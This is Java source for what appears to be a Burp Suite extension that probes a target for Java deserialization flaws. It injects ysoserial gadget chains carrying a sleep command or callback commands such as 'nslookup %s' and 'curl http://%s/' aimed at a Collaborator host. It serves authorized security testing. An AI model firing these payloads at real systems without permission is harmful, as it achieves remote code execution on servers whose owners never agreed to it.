package burp.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.core.Encoder;
import burp.core.ExecutorProvider;
import burp.core.Settings;
import burp.core.YsoserialEngine;
import burp.model.DetectionResult;
import burp.model.HostIntel;

import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import java.util.function.Function;

/**
 * Active deserialization detection for a single insertion point. Two strategies:
 * <ul>
 *   <li><b>Time-based</b> — inject a command-capable chain whose command sleeps N seconds
 *       and compare response time against a baseline + threshold. Works with no callbacks.</li>
 *   <li><b>DNS (Collaborator)</b> — inject {@code URLDNS} pointed at a Collaborator payload and
 *       poll for a DNS interaction. No time sensitivity, but needs Collaborator reachability.</li>
 * </ul>
 *
 * <p>Probes run on the shared {@link ExecutorProvider} pool so multiple gadgets are tried
 * concurrently. Confirmed hits are pushed into {@link HostIntel} to sharpen the recommender.
 */
public final class DeserializationScanEngine {

    private final MontoyaApi api;
    private final Settings settings;
    private final YsoserialEngine yso;
    private final ExecutorProvider executors;

    public DeserializationScanEngine(MontoyaApi api, Settings settings,
                                     YsoserialEngine yso, ExecutorProvider executors) {
        this.api = api;
        this.settings = settings;
        this.yso = yso;
        this.executors = executors;
    }

    /**
     * @param host        target host (for intel bookkeeping)
     * @param gadgets     chains to try
     * @param encoding    transport encoding for the insertion point
     * @param requestFor  given an encoded payload string, produce the request to send
     * @param baseRequest the unmodified request, used to measure a timing baseline
     * @param onResult    callback per probe (invoked off the EDT)
     */
    public void timeBasedScan(String host, List<String> gadgets, Encoder encoding,
                              Function<String, HttpRequest> requestFor, HttpRequest baseRequest,
                              Consumer<DetectionResult> onResult) {

        long baseline = measure(baseRequest);
        int sleep = settings.sleepSeconds();
        long threshold = settings.timeThresholdMs();

        // Time-based probing only makes sense for chains that take a plain OS command.
        // URLDNS/JRMPClient (no command) and C3P0/AspectJWeaver (special arg formats) are skipped.
        List<String> runnable = gadgets.stream()
                .filter(g -> burp.core.GadgetCatalog.metadata(g).commandCapable())
                .toList();
        int skipped = gadgets.size() - runnable.size();
        if (skipped > 0) {
            api.logging().logToOutput("[JDS-NG] time-based: skipped " + skipped
                    + " non-command chain(s) (URLDNS/JRMPClient/C3P0/AspectJWeaver).");
        }

        for (String gadget : runnable) {
            executors.pool().submit(() -> {
                try {
                    String cmd = sleepCommand(sleep);
                    byte[] raw = yso.generate(gadget, cmd);
                    HttpRequest req = requestFor.apply(encoding.encode(raw));
                    long elapsed = measure(req);
                    boolean hit = (elapsed - baseline) >= (sleep * 1000L - 500) && (elapsed - baseline) >= threshold;
                    if (hit) HostIntel.get().recordConfirmed(host, gadget);
                    onResult.accept(new DetectionResult(host, gadget, DetectionResult.Method.TIME_BASED,
                            hit, elapsed, "baseline=" + baseline + "ms elapsed=" + elapsed + "ms"));
                } catch (Throwable e) {
                    String msg = YsoserialEngine.describe(e);
                    api.logging().logToError("[JDS-NG] time-based " + gadget + " failed: " + msg);
                    onResult.accept(new DetectionResult(host, gadget, DetectionResult.Method.TIME_BASED,
                            false, -1, "error: " + msg));
                }
            });
        }
    }

    /**
     * Out-of-band (Collaborator) detection across one or many chains — not just URLDNS.
     *
     * <p>For each gadget a <b>dedicated</b> Collaborator client is created so an interaction maps
     * unambiguously back to the chain that caused it. The command sent depends on the chain:
     * <ul>
     *   <li><b>URLDNS</b> — its argument is the Collaborator URL directly (no OS command needed;
     *       proves deserialization even without any vulnerable library).</li>
     *   <li><b>command chains</b> (CommonsCollections, Spring, …) — the OS command is built from
     *       {@code callbackTemplate} (e.g. {@code nslookup %s}, {@code curl http://%s/}), so a
     *       DNS/HTTP hit proves <em>code execution</em>, confirming the library-specific chain.</li>
     * </ul>
     *
     * @param callbackTemplate a command with one {@code %s} placeholder for the Collaborator host
     */
    public void collaboratorScan(String host, List<String> gadgets, Encoder encoding,
                                 Function<String, HttpRequest> requestFor, String callbackTemplate,
                                 Consumer<DetectionResult> onResult) {
        executors.pool().submit(() -> {
            // Fire every payload first, remembering which client belongs to which gadget.
            List<Object[]> pending = new ArrayList<>(); // {gadget, CollaboratorClient, domain}
            for (String gadget : gadgets) {
                try {
                    CollaboratorClient client = api.collaborator().createClient();
                    CollaboratorPayload payload = client.generatePayload();
                    String domain = payload.toString();

                    String command;
                    byte[] raw;
                    if (gadget.equalsIgnoreCase("URLDNS")) {
                        command = "http://" + domain + "/";
                        raw = yso.generate("URLDNS", command);
                    } else {
                        command = String.format(callbackTemplate, domain);
                        raw = yso.generate(gadget, command);
                    }
                    api.http().sendRequest(requestFor.apply(encoding.encode(raw)));
                    pending.add(new Object[]{gadget, client, domain});
                } catch (Throwable e) {
                    String msg = YsoserialEngine.describe(e);
                    api.logging().logToError("[JDS-NG] OOB " + gadget + " failed: " + msg);
                    onResult.accept(new DetectionResult(host, gadget, DetectionResult.Method.DNS_COLLABORATOR,
                            false, -1, "error: " + msg));
                }
            }

            // Poll all clients for interactions; Collaborator DNS can lag the HTTP response.
            java.util.Set<String> hit = new java.util.HashSet<>();
            for (int round = 0; round < 10 && hit.size() < pending.size(); round++) {
                try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
                for (Object[] p : pending) {
                    String gadget = (String) p[0];
                    if (hit.contains(gadget)) continue;
                    CollaboratorClient client = (CollaboratorClient) p[1];
                    List<Interaction> interactions = client.getAllInteractions();
                    if (!interactions.isEmpty()) {
                        hit.add(gadget);
                        HostIntel.get().recordConfirmed(host, gadget);
                        onResult.accept(new DetectionResult(host, gadget, DetectionResult.Method.DNS_COLLABORATOR,
                                true, -1, interactions.size() + " interaction(s) via " + p[2]));
                    }
                }
            }
            // Report the chains that never called back.
            for (Object[] p : pending) {
                String gadget = (String) p[0];
                if (!hit.contains(gadget)) {
                    onResult.accept(new DetectionResult(host, gadget, DetectionResult.Method.DNS_COLLABORATOR,
                            false, -1, "no interaction within timeout (" + p[2] + ")"));
                }
            }
        });
    }

    // ------------------------------------------------------------------ helpers

    /** Cross-platform sleep. `ping` is a reliable sleep primitive when `sleep` is absent. */
    private static String sleepCommand(int seconds) {
        // Unix-first; Windows targets fall back to ping. Most deserialization labs are Unix.
        return "sleep " + seconds;
    }

    private long measure(HttpRequest req) {
        long start = System.nanoTime();
        try {
            HttpRequestResponse rr = api.http().sendRequest(req);
            // touch the response so timing includes body read
            if (rr.response() != null) rr.response().statusCode();
        } catch (Exception ignored) { }
        return (System.nanoTime() - start) / 1_000_000L;
    }
}
